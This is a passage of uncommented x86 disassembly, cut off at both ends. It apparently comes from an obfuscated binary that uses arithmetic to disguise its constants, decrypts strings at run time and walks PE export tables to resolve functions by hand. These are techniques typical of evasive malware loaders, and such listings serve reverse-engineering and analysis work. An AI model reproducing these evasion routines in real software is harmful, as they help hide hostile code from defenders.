  418dfc:	mov    esi,0x8a8d
  418e01:	push   edi
  418e02:	xor    eax,esi
  418e04:	mov    edi,0x4e22
  418e09:	mov    DWORD PTR [ebp-0x4],edx
  418e0c:	cmp    ax,di
  418e0f:	je     0x418e3c
  418e11:	mov    eax,DWORD PTR [ebp+0x8]
  418e14:	sub    eax,edx
  418e16:	mov    DWORD PTR [ebp+0x8],eax
  418e19:	jmp    0x418e1e
  418e1b:	mov    eax,DWORD PTR [ebp+0x8]
  418e1e:	mov    WORD PTR [edx],cx
  418e21:	add    edx,0x2
  418e24:	movzx  edi,WORD PTR [eax+edx*1]
  418e28:	mov    ecx,edi
  418e2a:	add    edi,0xffffc4af
  418e30:	xor    edi,esi
  418e32:	mov    eax,0x4e22
  418e37:	cmp    di,ax
  418e3a:	jne    0x418e1b
  418e3c:	xor    eax,eax
  418e3e:	pop    edi
  418e3f:	mov    WORD PTR [edx],ax
  418e42:	mov    eax,DWORD PTR [ebp-0x4]
  418e45:	pop    esi
  418e46:	leave  
  418e47:	ret    0x4
  418e4a:	push   ebp
  418e4b:	mov    ebp,esp
  418e4d:	sub    esp,0x18
  418e50:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  418e57:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  418e5e:	mov    eax,DWORD PTR [ebp-0x14]
  418e61:	xor    eax,0x751089b
  418e66:	add    eax,0x3272e2
  418e6b:	mov    DWORD PTR [ebp-0x8],eax
  418e6e:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  418e75:	mov    DWORD PTR [ebp-0xc],0xf89c85b9
  418e7c:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  418e83:	mov    eax,DWORD PTR [ebp-0x14]
  418e86:	xor    eax,0x751089b
  418e8b:	mov    ecx,DWORD PTR [ebp-0x8]
  418e8e:	lea    eax,[ecx+eax*1+0x3272e2]
  418e95:	mov    ecx,DWORD PTR [ebp-0x18]
  418e98:	xor    ecx,0x751089b
  418e9e:	add    ecx,0x3272e2
  418ea4:	mov    edx,DWORD PTR [ebp+0x10]
  418ea7:	imul   edx,ecx
  418eaa:	cmp    eax,edx
  418eac:	jae    0x418f9f
  418eb2:	mov    eax,DWORD PTR [ebp+0x10]
  418eb5:	mov    ecx,DWORD PTR [ebp-0x8]
  418eb8:	sub    eax,ecx
  418eba:	mov    ecx,DWORD PTR [ebp-0x10]
  418ebd:	xor    ecx,0x751089b
  418ec3:	add    ecx,0x3272e2
  418ec9:	cmp    eax,ecx
  418ecb:	jbe    0x418efd
  418ecd:	mov    eax,DWORD PTR [ebp+0x8]
  418ed0:	add    eax,DWORD PTR [ebp-0x8]
  418ed3:	mov    ecx,DWORD PTR [ebp+0xc]
  418ed6:	add    ecx,DWORD PTR [ebp-0x8]
  418ed9:	mov    edx,DWORD PTR [ecx]
  418edb:	mov    DWORD PTR [eax],edx
  418edd:	mov    ecx,DWORD PTR [ecx+0x4]
  418ee0:	mov    DWORD PTR [eax+0x4],ecx
  418ee3:	mov    eax,DWORD PTR [ebp-0x10]
  418ee6:	xor    eax,0x751089b
  418eeb:	mov    ecx,DWORD PTR [ebp-0x8]
  418eee:	lea    eax,[ecx+eax*1+0x3272e2]
  418ef5:	mov    DWORD PTR [ebp-0x8],eax
  418ef8:	jmp    0x418f9a
  418efd:	mov    eax,DWORD PTR [ebp+0x10]
  418f00:	mov    ecx,DWORD PTR [ebp-0x8]
  418f03:	sub    eax,ecx
  418f05:	mov    ecx,DWORD PTR [ebp-0xc]
  418f08:	xor    ecx,0x751089b
  418f0e:	add    ecx,0x3272e2
  418f14:	cmp    eax,ecx
  418f16:	jbe    0x418f3f
  418f18:	mov    eax,DWORD PTR [ebp+0x8]
  418f1b:	add    eax,DWORD PTR [ebp-0x8]
  418f1e:	mov    ecx,DWORD PTR [ebp+0xc]
  418f21:	add    ecx,DWORD PTR [ebp-0x8]
  418f24:	mov    ecx,DWORD PTR [ecx]
  418f26:	mov    DWORD PTR [eax],ecx
  418f28:	mov    eax,DWORD PTR [ebp-0xc]
  418f2b:	xor    eax,0x751089b
  418f30:	mov    ecx,DWORD PTR [ebp-0x8]
  418f33:	lea    eax,[ecx+eax*1+0x3272e2]
  418f3a:	mov    DWORD PTR [ebp-0x8],eax
  418f3d:	jmp    0x418f9a
  418f3f:	mov    eax,DWORD PTR [ebp+0x10]
  418f42:	mov    ecx,DWORD PTR [ebp-0x8]
  418f45:	sub    eax,ecx
  418f47:	mov    ecx,DWORD PTR [ebp-0x4]
  418f4a:	xor    ecx,0x751089b
  418f50:	add    ecx,0x3272e2
  418f56:	cmp    eax,ecx
  418f58:	jbe    0x418f83
  418f5a:	mov    eax,DWORD PTR [ebp+0x8]
  418f5d:	add    eax,DWORD PTR [ebp-0x8]
  418f60:	mov    ecx,DWORD PTR [ebp+0xc]
  418f63:	add    ecx,DWORD PTR [ebp-0x8]
  418f66:	mov    cx,WORD PTR [ecx]
  418f69:	mov    WORD PTR [eax],cx
  418f6c:	mov    eax,DWORD PTR [ebp-0x4]
  418f6f:	xor    eax,0x751089b
  418f74:	mov    ecx,DWORD PTR [ebp-0x8]
  418f77:	lea    eax,[ecx+eax*1+0x3272e2]
  418f7e:	mov    DWORD PTR [ebp-0x8],eax
  418f81:	jmp    0x418f9a
  418f83:	mov    eax,DWORD PTR [ebp+0x8]
  418f86:	add    eax,DWORD PTR [ebp-0x8]
  418f89:	mov    ecx,DWORD PTR [ebp+0xc]
  418f8c:	add    ecx,DWORD PTR [ebp-0x8]
  418f8f:	mov    cl,BYTE PTR [ecx]
  418f91:	mov    BYTE PTR [eax],cl
  418f93:	mov    eax,DWORD PTR [ebp-0x8]
  418f96:	inc    eax
  418f97:	mov    DWORD PTR [ebp-0x8],eax
  418f9a:	jmp    0x418e83
  418f9f:	leave  
  418fa0:	ret    0xc
  418fa3:	push   ebp
  418fa4:	mov    ebp,esp
  418fa6:	sub    esp,0xc
  418fa9:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  418fb0:	push   esi
  418fb1:	mov    esi,eax
  418fb3:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  418fba:	mov    edx,DWORD PTR [ebp-0x4]
  418fbd:	mov    eax,0x751089b
  418fc2:	xor    edx,eax
  418fc4:	mov    ecx,0x3272e2
  418fc9:	add    edx,ecx
  418fcb:	cmp    esi,edx
  418fcd:	je     0x41900f
  418fcf:	push   ebx
  418fd0:	push   edi
  418fd1:	mov    edx,DWORD PTR [ebp-0x8]
  418fd4:	mov    ebx,DWORD PTR [ebp+0x8]
  418fd7:	xor    edx,eax
  418fd9:	mov    edi,0xffcd8d1e
  418fde:	sub    edi,edx
  418fe0:	add    esi,edi
  418fe2:	lea    edx,[esi-0x3272e2]
  418fe8:	xor    edx,eax
  418fea:	mov    DWORD PTR [ebp-0xc],edx
  418fed:	mov    edx,DWORD PTR [ebp-0x4]
  418ff0:	mov    edi,DWORD PTR [ebp-0xc]
  418ff3:	xor    dl,0x9b
  418ff6:	sub    dl,0x1e
  418ff9:	xor    edi,eax
  418ffb:	mov    BYTE PTR [edi+ebx*1+0x3272e2],dl
  419002:	mov    edx,DWORD PTR [ebp-0x4]
  419005:	xor    edx,eax
  419007:	add    edx,ecx
  419009:	cmp    esi,edx
  41900b:	jne    0x418fd1
  41900d:	pop    edi
  41900e:	pop    ebx
  41900f:	pop    esi
  419010:	leave  
  419011:	ret    0x4
  419014:	push   ebp
  419015:	mov    ebp,esp
  419017:	sub    esp,0x21c
  41901d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  419024:	mov    DWORD PTR [ebp-0x14],0xf89c8584
  41902b:	mov    eax,DWORD PTR [ebp+0x10]
  41902e:	mov    eax,DWORD PTR [ebp-0x4]
  419031:	mov    ecx,DWORD PTR [ebp+0x8]
  419034:	push   esi
  419035:	push   edi
  419036:	mov    edi,0x751089b
  41903b:	xor    eax,edi
  41903d:	mov    esi,0x3272e2
  419042:	add    eax,esi
  419044:	cmp    eax,ecx
  419046:	mov    eax,DWORD PTR [ebp-0x4]
  419049:	jne    0x419054
  41904b:	xor    eax,edi
  41904d:	add    eax,esi
  41904f:	jmp    0x419100
  419054:	mov    ecx,DWORD PTR [ebp+0xc]
  419057:	xor    eax,edi
  419059:	add    eax,esi
  41905b:	cmp    eax,ecx
  41905d:	jne    0x419064
  41905f:	mov    eax,DWORD PTR [ebp-0x4]
  419062:	jmp    0x41904b
  419064:	lea    eax,[ebp-0x21c]
  41906a:	mov    DWORD PTR [ebp-0x8],eax
  41906d:	mov    eax,DWORD PTR [ebp+0xc]
  419070:	mov    DWORD PTR [ebp-0x10],eax
  419073:	mov    eax,DWORD PTR [ebp-0x4]
  419076:	xor    eax,edi
  419078:	add    eax,esi
  41907a:	mov    DWORD PTR [ebp+0x10],eax
  41907d:	mov    eax,DWORD PTR [ebp+0xc]
  419080:	push   ebx
  419081:	call   0x418d5c
  419086:	mov    ebx,eax
  419088:	mov    eax,DWORD PTR [ebp+0x8]
  41908b:	mov    eax,DWORD PTR [eax+0x14]
  41908e:	jmp    0x4190e8
  419090:	mov    eax,DWORD PTR [ebp+0xc]
  419093:	sub    eax,0x8
  419096:	mov    DWORD PTR [ebp-0xc],eax
  419099:	mov    eax,DWORD PTR [ebp-0xc]
  41909c:	mov    eax,DWORD PTR [eax+0x28]
  41909f:	call   0x418c44
  4190a4:	mov    DWORD PTR [ebp+0x10],eax
  4190a7:	push   DWORD PTR [ebp+0x10]
  4190aa:	mov    edx,DWORD PTR [ebp-0x8]
  4190ad:	call   0x418deb
  4190b2:	mov    eax,DWORD PTR [ebp-0x4]
  4190b5:	xor    eax,edi
  4190b7:	add    eax,esi
  4190b9:	cmp    eax,ebx
  4190bb:	jne    0x4190c5
  4190bd:	mov    eax,DWORD PTR [ebp-0x8]
  4190c0:	call   0x418cd2
  4190c5:	mov    eax,DWORD PTR [ebp-0x14]
  4190c8:	xor    eax,edi
  4190ca:	add    eax,esi
  4190cc:	push   eax
  4190cd:	push   DWORD PTR [ebp-0x10]
  4190d0:	mov    eax,DWORD PTR [ebp-0x8]
  4190d3:	call   0x4189fe
  4190d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4190db:	xor    ecx,edi
  4190dd:	add    ecx,esi
  4190df:	cmp    eax,ecx
  4190e1:	je     0x419106
  4190e3:	mov    eax,DWORD PTR [ebp+0xc]
  4190e6:	mov    eax,DWORD PTR [eax]
  4190e8:	mov    DWORD PTR [ebp+0xc],eax
  4190eb:	mov    eax,DWORD PTR [ebp+0x8]
  4190ee:	mov    ecx,DWORD PTR [ebp+0xc]
  4190f1:	add    eax,0x14
  4190f4:	cmp    ecx,eax
  4190f6:	jne    0x419090
  4190f8:	mov    eax,DWORD PTR [ebp-0x4]
  4190fb:	xor    eax,edi
  4190fd:	add    eax,esi
  4190ff:	pop    ebx
  419100:	pop    edi
  419101:	pop    esi
  419102:	leave  
  419103:	ret    0xc
  419106:	mov    eax,DWORD PTR [ebp-0xc]
  419109:	mov    eax,DWORD PTR [eax+0x18]
  41910c:	jmp    0x4190ff
  41910e:	push   ebp
  41910f:	mov    ebp,esp
  419111:	mov    eax,DWORD PTR [ebp+0xc]
  419114:	sub    esp,0x10
  419117:	cmp    DWORD PTR [ebp+0x8],0x0
  41911b:	push   ebx
  41911c:	push   esi
  41911d:	push   edi
  41911e:	je     0x4191d3
  419124:	test   eax,eax
  419126:	je     0x4191d3
  41912c:	movzx  eax,WORD PTR [eax+0x20]
  419130:	mov    ecx,eax
  419132:	mov    DWORD PTR [ebp-0x10],eax
  419135:	xor    edx,edx
  419137:	and    DWORD PTR [ebp-0x8],edx
  41913a:	mov    eax,0x8a8d
  41913f:	xor    ecx,eax
  419141:	add    ecx,0x3b51
  419147:	mov    DWORD PTR [ebp-0xc],ecx
  41914a:	and    DWORD PTR [ebp-0x4],0x0
  41914e:	xor    ecx,ecx
  419150:	push   0x7e
  419152:	pop    edi
  419153:	cmp    cx,WORD PTR [ebp-0xc]
  419157:	jae    0x4191bd
  419159:	lea    esi,[edx-0x3b51]
  41915f:	xor    esi,eax
  419161:	movzx  ecx,WORD PTR [ebp-0x4]
  419165:	mov    ebx,DWORD PTR [ebp+0xc]
  419168:	lea    ecx,[ebx+ecx*4]
  41916b:	cmp    WORD PTR [ecx+0x2],si
  41916f:	jne    0x4191a8
  419171:	movzx  ecx,WORD PTR [ecx]
  419174:	mov    edi,0x4e22
  419179:	cmp    cx,di
  41917c:	jne    0x41918a
  41917e:	mov    ebx,DWORD PTR [ebp+0x8]
  419181:	movzx  edi,dx
  419184:	cmp    BYTE PTR [edi+ebx*1],0x0
  419188:	je     0x4191b7
  41918a:	mov    ebx,DWORD PTR [ebp+0x8]
  41918d:	movzx  edi,dx
  419190:	movsx  di,BYTE PTR [edi+ebx*1]
  419195:	mov    ebx,0x3b51
  41919a:	sub    di,bx
  41919d:	xor    di,ax
  4191a0:	cmp    cx,di
  4191a3:	je     0x4191b7
  4191a5:	push   0x7c
  4191a7:	pop    edi
  4191a8:	inc    DWORD PTR [ebp-0x4]
  4191ab:	mov    cx,WORD PTR [ebp-0xc]
  4191af:	cmp    WORD PTR [ebp-0x4],cx
  4191b3:	jb     0x419161
  4191b5:	jmp    0x4191bd
  4191b7:	inc    DWORD PTR [ebp-0x8]
  4191ba:	push   0x7d
  4191bc:	pop    edi
  4191bd:	mov    esi,DWORD PTR [ebp+0x8]
  4191c0:	movzx  ecx,dx
  4191c3:	cmp    BYTE PTR [ecx+esi*1],0x0
  4191c7:	je     0x4191dc
  4191c9:	inc    edx
  4191ca:	cmp    edi,0x7c
  4191cd:	jne    0x41914a
  4191d3:	xor    eax,eax
  4191d5:	pop    edi
  4191d6:	pop    esi
  4191d7:	pop    ebx
  4191d8:	leave  
  4191d9:	ret    0x8
  4191dc:	mov    ecx,DWORD PTR [ebp-0x8]
  4191df:	add    ecx,0xffffc4af
  4191e5:	xor    cx,ax
  4191e8:	xor    eax,eax
  4191ea:	cmp    cx,WORD PTR [ebp-0x10]
  4191ee:	sete   al
  4191f1:	jmp    0x4191d5
  4191f3:	push   ebp
  4191f4:	mov    ebp,esp
  4191f6:	sub    esp,0x50
  4191f9:	push   edi
  4191fa:	mov    edi,eax
  4191fc:	mov    eax,DWORD PTR [edi+0x1a8]
  419202:	cmp    DWORD PTR [eax],0x0
  419205:	jne    0x41920e
  419207:	xor    eax,eax
  419209:	jmp    0x41933f
  41920e:	push   DWORD PTR [ebp+0x8]
  419211:	push   0x2c
  419213:	pop    eax
  419214:	call   0x418fa3
  419219:	mov    edx,DWORD PTR [edi+0x1ac]
  41921f:	lea    eax,[edi+0x22]
  419222:	mov    DWORD PTR [ebp-0x4c],eax
  419225:	lea    eax,[edi+0x44]
  419228:	mov    DWORD PTR [ebp-0x48],eax
  41922b:	lea    eax,[edi+0x66]
  41922e:	mov    DWORD PTR [ebp-0x44],eax
  419231:	lea    eax,[edi+0x88]
  419237:	mov    DWORD PTR [ebp-0x40],eax
  41923a:	lea    eax,[edi+0xaa]
  419240:	mov    DWORD PTR [ebp-0x3c],eax
  419243:	lea    eax,[edi+0xcc]
  419249:	mov    DWORD PTR [ebp-0x38],eax
  41924c:	lea    eax,[edi+0xee]
  419252:	mov    DWORD PTR [ebp-0x34],eax
  419255:	lea    eax,[edi+0x110]
  41925b:	mov    DWORD PTR [ebp-0x30],eax
  41925e:	lea    eax,[edi+0x132]
  419264:	mov    DWORD PTR [ebp-0x2c],eax
  419267:	lea    eax,[edi+0x154]
  41926d:	push   edi
  41926e:	mov    DWORD PTR [ebp-0x50],edi
  419271:	mov    DWORD PTR [ebp-0x28],eax
  419274:	call   0x419373
  419279:	push   eax
  41927a:	mov    eax,DWORD PTR [edi+0x1a8]
  419280:	push   DWORD PTR [eax]
  419282:	call   0x419014
  419287:	mov    DWORD PTR [ebp-0x10],eax
  41928a:	test   eax,eax
  41928c:	je     0x41933f
  419292:	mov    ecx,DWORD PTR [eax+0x3c]
  419295:	push   ebx
  419296:	push   esi
  419297:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41929b:	add    esi,eax
  41929d:	mov    edi,DWORD PTR [esi+0x24]
  4192a0:	mov    ecx,DWORD PTR [esi+0x1c]
  4192a3:	mov    edx,DWORD PTR [esi+0x20]
  4192a6:	mov    ebx,DWORD PTR [esi+0x18]
  4192a9:	add    edi,eax
  4192ab:	mov    DWORD PTR [ebp-0x20],edi
  4192ae:	mov    edi,DWORD PTR [esi+0x14]
  4192b1:	add    ecx,eax
  4192b3:	add    edx,eax
  4192b5:	mov    DWORD PTR [ebp-0xc],ecx
  4192b8:	mov    DWORD PTR [ebp-0x1c],edx
  4192bb:	mov    DWORD PTR [ebp-0x8],edi
  4192be:	cmp    edi,ebx
  4192c0:	ja     0x4192c5
  4192c2:	mov    DWORD PTR [ebp-0x8],ebx
  4192c5:	xor    ebx,ebx
  4192c7:	mov    DWORD PTR [ebp-0x18],ebx
  4192ca:	cmp    DWORD PTR [ebp-0x8],ebx
  4192cd:	jbe    0x41933d
  4192cf:	jmp    0x4192d4
  4192d1:	mov    edx,DWORD PTR [ebp-0x1c]
  4192d4:	mov    edi,DWORD PTR [ebp-0x20]
  4192d7:	movzx  edi,WORD PTR [edi+ebx*2]
  4192db:	cmp    ebx,DWORD PTR [esi+0x18]
  4192de:	jae    0x41933d
  4192e0:	cmp    edi,DWORD PTR [esi+0x14]
  4192e3:	jae    0x41933d
  4192e5:	mov    ebx,DWORD PTR [edx+ebx*4]
  4192e8:	mov    edx,DWORD PTR [ebp+0x8]
  4192eb:	mov    edi,DWORD PTR [ecx+edi*4]
  4192ee:	mov    DWORD PTR [ebp-0x4],edx
  4192f1:	lea    edx,[ebp-0x50]
  4192f4:	add    ebx,eax
  4192f6:	add    edi,eax
  4192f8:	sub    edx,DWORD PTR [ebp+0x8]
  4192fb:	mov    DWORD PTR [ebp-0x14],0xb
  419302:	mov    DWORD PTR [ebp-0x24],edx
  419305:	mov    edx,DWORD PTR [ebp-0x4]
  419308:	cmp    DWORD PTR [edx],0x0
  41930b:	jne    0x419328
  41930d:	mov    eax,DWORD PTR [ebp-0x24]
  419310:	push   DWORD PTR [eax+edx*1]
  419313:	push   ebx
  419314:	call   0x41910e
  419319:	mov    ecx,DWORD PTR [ebp-0xc]
  41931c:	test   eax,eax
  41931e:	je     0x419325
  419320:	mov    eax,DWORD PTR [ebp-0x4]
  419323:	mov    DWORD PTR [eax],edi
  419325:	mov    eax,DWORD PTR [ebp-0x10]
  419328:	add    DWORD PTR [ebp-0x4],0x4
  41932c:	dec    DWORD PTR [ebp-0x14]
  41932f:	jne    0x419305
  419331:	mov    ebx,DWORD PTR [ebp-0x18]
  419334:	inc    ebx
  419335:	mov    DWORD PTR [ebp-0x18],ebx
  419338:	cmp    ebx,DWORD PTR [ebp-0x8]
  41933b:	jb     0x4192d1
  41933d:	pop    esi
  41933e:	pop    ebx
  41933f:	pop    edi
  419340:	leave  
  419341:	ret    0x4
  419344:	push   ebp
  419345:	mov    ebp,esp
  419347:	mov    eax,DWORD PTR [ebp+0x8]
  41934a:	push   esi
  41934b:	push   DWORD PTR [eax+0x1d8]
  419351:	lea    esi,[eax+0x198]
  419357:	mov    eax,DWORD PTR [ebp+0x8]
  41935a:	call   0x4191f3
  41935f:	mov    ecx,DWORD PTR [esi]
  419361:	mov    DWORD PTR [ecx],eax
  419363:	mov    eax,DWORD PTR [esi]
  419365:	xor    ecx,ecx
  419367:	cmp    DWORD PTR [eax],ecx
  419369:	pop    esi
  41936a:	setne  cl
  41936d:	mov    eax,ecx
  41936f:	pop    ebp
  419370:	ret    0x4
  419373:	mov    ecx,DWORD PTR [edi+0x188]
  419379:	push   ebx
  41937a:	jmp    0x41938f
  41937c:	xor    eax,0x8a8d
  419381:	add    eax,0x3b51
  419386:	mov    WORD PTR [ecx],ax
  419389:	add    ecx,0x2
  41938c:	add    edx,0x2
  41938f:	movzx  eax,WORD PTR [edx]
  419392:	mov    ebx,0x4e22
  419397:	cmp    ax,bx
  41939a:	jne    0x41937c
  41939c:	xor    eax,eax
  41939e:	mov    WORD PTR [ecx],ax
  4193a1:	mov    eax,DWORD PTR [edi+0x188]
  4193a7:	pop    ebx
  4193a8:	ret    
  4193a9:	push   edi
  4193aa:	mov    edi,eax
  4193ac:	mov    eax,DWORD PTR [esi+0x188]
  4193b2:	shl    edi,0x6
  4193b5:	add    eax,edi
  4193b7:	jmp    0x4193c3
  4193b9:	xor    cl,0x74
  4193bc:	sub    cl,0x8
  4193bf:	mov    BYTE PTR [eax],cl
  4193c1:	inc    eax
  4193c2:	inc    edx
  4193c3:	mov    cl,BYTE PTR [edx]
  4193c5:	cmp    cl,0x7c
  4193c8:	jne    0x4193b9
  4193ca:	mov    BYTE PTR [eax],0x0
  4193cd:	mov    eax,DWORD PTR [esi+0x188]
  4193d3:	add    eax,edi
  4193d5:	pop    edi
  4193d6:	ret    
  4193d7:	push   ebp
  4193d8:	mov    ebp,esp
  4193da:	sub    esp,0x38
  4193dd:	push   ebx
  4193de:	mov    ebx,0xf89c8585
  4193e3:	mov    DWORD PTR [ebp-0x4],ebx
  4193e6:	lea    eax,[ebx-0x1]
  4193e9:	push   esi
  4193ea:	mov    DWORD PTR [ebp-0x24],eax
  4193ed:	mov    ecx,DWORD PTR [ebp-0x4]
  4193f0:	mov    edx,DWORD PTR [ebp+0x8]
  4193f3:	mov    esi,0x751089b
  4193f8:	push   edi
  4193f9:	xor    ecx,esi
  4193fb:	mov    edi,0x3272e2
  419400:	add    ecx,edi
  419402:	cmp    edx,ecx
  419404:	je     0x419572
  41940a:	mov    ecx,DWORD PTR [ebp-0x4]
  41940d:	mov    edx,DWORD PTR [ebp+0xc]
  419410:	xor    ecx,esi
  419412:	add    ecx,edi
  419414:	cmp    edx,ecx
  419416:	je     0x419572
  41941c:	mov    ecx,DWORD PTR [ebp+0x10]
  41941f:	mov    DWORD PTR [ebp-0x18],ecx
  419422:	mov    ecx,DWORD PTR [ebp+0xc]
  419425:	mov    DWORD PTR [ebp-0x14],ecx
  419428:	mov    ecx,DWORD PTR [ebp+0x8]
  41942b:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  419432:	mov    DWORD PTR [ebp-0x20],eax
  419435:	mov    DWORD PTR [ebp-0x10],ebx
  419438:	mov    DWORD PTR [ebp+0xc],eax
  41943b:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  419442:	mov    eax,DWORD PTR [ebp+0xc]
  419445:	mov    DWORD PTR [ebp-0xc],ecx
  419448:	xor    eax,esi
  41944a:	mov    ecx,0xffcd8d1e
  41944f:	sub    ecx,eax
  419451:	add    ecx,DWORD PTR [ebp-0x14]
  419454:	mov    DWORD PTR [ebp+0x8],ecx
  419457:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41945e:	jmp    0x419562
  419463:	mov    eax,DWORD PTR [ebp+0xc]
  419466:	mov    ecx,DWORD PTR [ebp+0xc]
  419469:	xor    eax,esi
  41946b:	xor    ecx,esi
  41946d:	lea    ecx,[eax+ecx*1+0x64e5c4]
  419474:	mov    eax,DWORD PTR [ebp+0x8]
  419477:	xor    edx,edx
  419479:	div    ecx
  41947b:	mov    eax,DWORD PTR [ebp+0x10]
  41947e:	mov    ecx,DWORD PTR [ebp+0xc]
  419481:	xor    eax,esi
  419483:	xor    ecx,esi
  419485:	sub    eax,ecx
  419487:	cmp    edx,eax
  419489:	jne    0x41951e
  41948f:	mov    eax,DWORD PTR [ebp+0x8]
  419492:	add    eax,DWORD PTR [ebp-0xc]
  419495:	mov    dl,BYTE PTR [eax]
  419497:	mov    eax,DWORD PTR [ebp-0x10]
  41949a:	mov    ecx,DWORD PTR [ebp-0x8]
  41949d:	xor    eax,esi
  41949f:	xor    ecx,esi
  4194a1:	add    eax,edi
  4194a3:	add    ecx,edi
  4194a5:	cmp    eax,ecx
  4194a7:	jae    0x4194ef
  4194a9:	lea    ecx,[eax-0x3272e2]
  4194af:	mov    DWORD PTR [ebp-0x4],ecx
  4194b2:	mov    ebx,DWORD PTR [ebp-0x4]
  4194b5:	xor    ebx,esi
  4194b7:	add    ebx,0x7f55d8fb
  4194bd:	lea    ecx,[ebp+eax*4-0x38]
  4194c1:	mov    DWORD PTR [ecx],ebx
  4194c3:	mov    ebx,DWORD PTR [ecx]
  4194c5:	cmp    ebx,0x244ecbda
  4194cb:	jbe    0x4194d5
  4194cd:	add    DWORD PTR [ecx],0x405fc19
  4194d3:	jmp    0x4194db
  4194d5:	add    DWORD PTR [ecx],0xfdaf43e7
  4194db:	mov    ecx,DWORD PTR [ebp-0x8]
  4194de:	xor    ecx,esi
  4194e0:	inc    eax
  4194e1:	inc    DWORD PTR [ebp-0x4]
  4194e4:	add    ecx,edi
  4194e6:	cmp    eax,ecx
  4194e8:	jb     0x4194b2
  4194ea:	mov    ebx,0xf89c8585
  4194ef:	mov    eax,DWORD PTR [ebp-0x18]
  4194f2:	test   eax,eax
  4194f4:	jne    0x4194fe
  4194f6:	xor    dl,0x74
  4194f9:	sub    dl,0x8
  4194fc:	jmp    0x419514
  4194fe:	mov    eax,DWORD PTR [ebp-0x1c]
  419501:	xor    al,0x9b
  419503:	mov    cl,0x1e
  419505:	sub    cl,al
  419507:	add    dl,cl
  419509:	mov    ecx,DWORD PTR [ebp-0x20]
  41950c:	xor    cl,0x9b
  41950f:	sub    cl,0x1e
  419512:	ror    dl,cl
  419514:	xor    eax,eax
  419516:	mov    eax,DWORD PTR [ebp+0x8]
  419519:	add    eax,DWORD PTR [ebp-0xc]
  41951c:	mov    BYTE PTR [eax],dl
  41951e:	mov    eax,DWORD PTR [ebp+0x8]
  419521:	mov    ecx,DWORD PTR [ebp-0x10]
  419524:	sub    eax,edi
  419526:	xor    eax,esi
  419528:	cmp    eax,ecx
  41952a:	jne    0x419550
  41952c:	mov    eax,DWORD PTR [ebp+0x10]
  41952f:	mov    ecx,DWORD PTR [ebp+0xc]
  419532:	xor    eax,esi
  419534:	xor    ecx,esi
  419536:	sub    eax,ecx
  419538:	sub    eax,edi
  41953a:	xor    eax,esi
  41953c:	mov    DWORD PTR [ebp+0x10],eax
  41953f:	mov    eax,DWORD PTR [ebp+0xc]
  419542:	xor    eax,esi
  419544:	mov    ecx,0xffcd8d1e
  419549:	sub    ecx,eax
  41954b:	add    ecx,DWORD PTR [ebp-0x14]
  41954e:	jmp    0x41955f
  419550:	mov    eax,DWORD PTR [ebp+0xc]
  419553:	xor    eax,esi
  419555:	mov    ecx,0xffcd8d1e
  41955a:	sub    ecx,eax
  41955c:	add    ecx,DWORD PTR [ebp+0x8]
  41955f:	mov    DWORD PTR [ebp+0x8],ecx
  419562:	mov    eax,DWORD PTR [ebp+0x10]
  419565:	cmp    eax,ebx
  419567:	jne    0x419463
  41956d:	mov    eax,DWORD PTR [ebp-0x24]
  419570:	jmp    0x419575
  419572:	mov    eax,DWORD PTR [ebp-0x4]
  419575:	xor    eax,esi
  419577:	add    eax,edi
  419579:	pop    edi
  41957a:	pop    esi
  41957b:	pop    ebx
  41957c:	leave  
  41957d:	ret    0xc
  419580:	push   ebp
  419581:	mov    ebp,esp
  419583:	sub    esp,0x14
  419586:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41958d:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  419594:	mov    eax,DWORD PTR [ebx]
  419596:	mov    DWORD PTR [ebp-0x8],eax
  419599:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4195a0:	push   esi
  4195a1:	push   edi
  4195a2:	mov    DWORD PTR [ebp-0x14],0xead718a5
  4195a9:	mov    edi,DWORD PTR [ebp-0x4]
  4195ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4195af:	mov    eax,0x751089b
  4195b4:	xor    edi,eax
  4195b6:	mov    edx,0x3272e2
  4195bb:	xor    ecx,eax
  4195bd:	add    edi,edx
  4195bf:	add    ecx,edx
  4195c1:	imul   edi,ecx
  4195c4:	jmp    0x41960c
  4195c6:	mov    ecx,DWORD PTR [ebp-0x8]
  4195c9:	mov    esi,DWORD PTR [ebp-0x4]
  4195cc:	xor    ecx,eax
  4195ce:	xor    esi,eax
  4195d0:	add    ecx,edx
  4195d2:	add    esi,edx
  4195d4:	test   esi,ecx
  4195d6:	mov    esi,DWORD PTR [ebp-0x8]
  4195d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4195dc:	je     0x4195f3
  4195de:	xor    ecx,eax
  4195e0:	xor    esi,eax
  4195e2:	add    ecx,edx
  4195e4:	add    esi,edx
  4195e6:	shr    esi,cl
  4195e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4195eb:	xor    ecx,eax
  4195ed:	add    ecx,edx
  4195ef:	xor    esi,ecx
  4195f1:	jmp    0x4195fd
  4195f3:	xor    esi,eax
  4195f5:	xor    ecx,eax
  4195f7:	add    esi,edx
  4195f9:	add    ecx,edx
  4195fb:	shr    esi,cl
  4195fd:	mov    DWORD PTR [ebp-0x8],esi
  419600:	mov    ecx,DWORD PTR [ebp-0x4]
  419603:	xor    ecx,eax
  419605:	lea    edi,[edi+ecx*1+0x3272e2]
  41960c:	mov    ecx,DWORD PTR [ebp-0xc]
  41960f:	mov    esi,DWORD PTR [ebp-0x4]
  419612:	xor    esi,eax
  419614:	xor    ecx,eax
  419616:	sub    ecx,esi
  419618:	cmp    edi,ecx
  41961a:	jbe    0x4195c6
  41961c:	mov    eax,DWORD PTR [ebp-0x8]
  41961f:	pop    edi
  419620:	mov    DWORD PTR [ebx],eax
  419622:	mov    eax,DWORD PTR [ebp-0x8]
  419625:	pop    esi
  419626:	leave  
  419627:	ret    
  419628:	push   ebp
  419629:	mov    ebp,esp
  41962b:	sub    esp,0x420
